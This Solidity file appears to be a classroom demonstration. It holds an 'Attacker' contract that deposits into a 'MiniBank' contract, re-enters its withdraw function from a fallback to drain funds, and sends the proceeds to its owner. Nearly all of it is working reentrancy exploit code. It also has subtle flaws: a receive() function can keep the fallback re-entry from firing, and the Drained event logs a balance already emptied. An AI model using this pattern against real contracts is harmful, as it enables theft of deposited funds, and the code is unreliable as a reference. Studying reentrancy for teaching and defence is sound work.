// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./IMiniBank.sol";

/// @title Attacker - Demonstrates reentrancy attack against MiniBank.withdraw
contract Attacker {
    IMiniBank public bank;
    address public owner;

    // max number of recursive reentries to avoid infinite loops in demos
    uint256 public maxReentry;
    uint256 public reentryCount;

    event AttackStarted(address indexed attacker, uint256 deposited);
    event Reentered(uint256 count);
    event Drained(address indexed to, uint256 amount);

    constructor(address _bank) {
        bank = IMiniBank(_bank);
        owner = msg.sender;
        maxReentry = 5; // default
    }

    /// @notice set maximum reentry attempts (useful in classroom to limit drain)
    function setMaxReentry(uint256 n) external {
        require(msg.sender == owner, "only owner");
        maxReentry = n;
    }

    /// @notice Deposit then trigger withdraw on the vulnerable bank
    function attack() external payable {
        require(msg.value > 0, "send ETH to attack with");

        // deposit into the vulnerable bank
        bank.deposit{value: msg.value}();

        emit AttackStarted(msg.sender, msg.value);

        // attempt to withdraw (this will trigger fallback and reentrancy)
        bank.withdraw(msg.value);
    }

    /// @notice fallback receives ETH from bank.withdraw and reenters if allowed
    fallback() external payable {
        // Increase reentry counter and optionally reenter
        if (reentryCount < maxReentry) {
            reentryCount += 1;
            emit Reentered(reentryCount);

            // Call withdraw again to reenter
            // We withdraw a small amount or whole balance depending on demonstration intent
            // Using try/catch is unnecessary here; we'll simply call withdraw and let it revert if conditions fail.
            uint256 myBal = bank.getBalance(address(this));
            if (myBal > 0) {
                // withdraw remaining balance (demonstration)
                bank.withdraw(myBal);
            }
        }
    }

    receive() external payable {
        // Also accept direct transfers
    }

    /// @notice Helper to pull out funds from attacker contract after demo
    function collect() external {
        require(msg.sender == owner, "only owner");
        (bool sent, ) = payable(owner).call{value: address(this).balance}("");
        require(sent, "collect failed");
        emit Drained(owner, address(this).balance);
    }
}
